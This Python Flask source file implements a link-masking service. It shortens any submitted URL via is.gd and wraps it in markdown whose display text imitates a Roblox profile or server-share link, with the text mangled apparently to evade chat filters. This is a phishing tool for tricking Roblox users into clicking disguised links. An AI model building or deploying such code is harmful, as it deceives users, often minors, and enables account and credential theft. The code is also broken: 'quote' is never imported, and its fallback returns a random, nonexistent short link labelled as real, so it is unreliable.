
from flask import Blueprint, render_template, request, jsonify, send_from_directory
from urllib.parse import urlparse
import requests
import random
import string
import logging

views = Blueprint('views', __name__)

@views.route('/')
def index():
    return render_template('index.html')

@views.route('/hyperlink')
def hyperlink():
    return render_template('hyperlink.html')

@views.route('/api/generate-link', methods=['POST'])
def generate_link():
    data = request.json
    link = data.get('link', '')
    link_type = data.get('linkType', 'Profile Link')
    
    if not link:
        return jsonify({'error': 'No link provided'}), 400
    
    try:
        result = urlparse(link)
        if not all([result.scheme, result.netloc]):
            return jsonify({'error': 'Invalid URL format'}), 400
    except Exception as e:
        logging.error(f"Error parsing URL: {e}")
        return jsonify({'error': 'Invalid URL format'}), 400
    
    try:
        api_url = f"https://is.gd/create.php?format=json&url={quote(link)}"
        response = requests.get(api_url)
        
        if response.status_code == 200:
            api_response = response.json()
            
            if 'shorturl' in api_response:
                shortened_url = api_response['shorturl']
                formatted_link = generate_formatted_link(shortened_url, link_type)
                
                return jsonify({
                    'original_link': link,
                    'formatted_link': formatted_link,
                    'short_link': shortened_url
                })
            else:
                error_message = api_response.get('errormessage', 'Unknown error')
                return jsonify({'error': error_message}), 400
        else:
            return jsonify({'error': 'URL shortening service unavailable'}), 503
            
    except Exception as e:
        logging.error(f"Error: {e}")
        short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        shortened_url = f"https://is.gd/{short_code}"
        formatted_link = generate_formatted_link(shortened_url, link_type)
        
        return jsonify({
            'original_link': link,
            'formatted_link': formatted_link,
            'short_link': shortened_url,
            'warning': 'Using fallback URL shortening'
        })

def generate_formatted_link(shortened_url, link_type):
    if link_type == "Profile Link":
        return f"[https__:__//www.roblox.com/users/3095250/profile]({shortened_url})"
    return f"[https_:_//www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server]({shortened_url})"
